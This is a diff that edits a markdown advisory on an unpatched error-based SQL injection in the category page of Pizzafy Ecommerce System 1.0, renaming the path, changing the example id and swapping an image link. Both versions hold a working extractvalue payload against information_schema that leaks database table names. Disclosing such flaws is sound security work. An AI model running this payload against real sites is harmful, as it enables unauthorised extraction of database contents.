@@ -8,10 +8,10 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `pizza/index.php?page=category&id=3`
+- `pizzafy/index.php?page=category&id=3`
 
 ## **Overview**
-The Pizzafy Ecommerce System 1.0 contains multiple critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
+The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
 
 ## **Vulnerability Description:**  
 # Error-Based SQL Injection Vulnerability in SELECT Operation
@@ -63,14 +63,14 @@ $cid= $_GET['id'] ?? "";
 Below is a **GET** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-http://localhost/pizza/index.php?page=category&id=1%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20--
+http://localhost/pizzafy/index.php?page=category&id=7%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20--
 ```
 
 ### **Explanation:**  
 This payload injects the SQL command:  
 
 ```sql
-id=1%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20--
+id=7%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20--
 ```
 This makes it possible to get data from the database.
 
@@ -78,7 +78,7 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/tiTIUSF.png)
+- ![](https://i.imgur.com/AEWJac4.png)
 ---
 
 ## Remediation
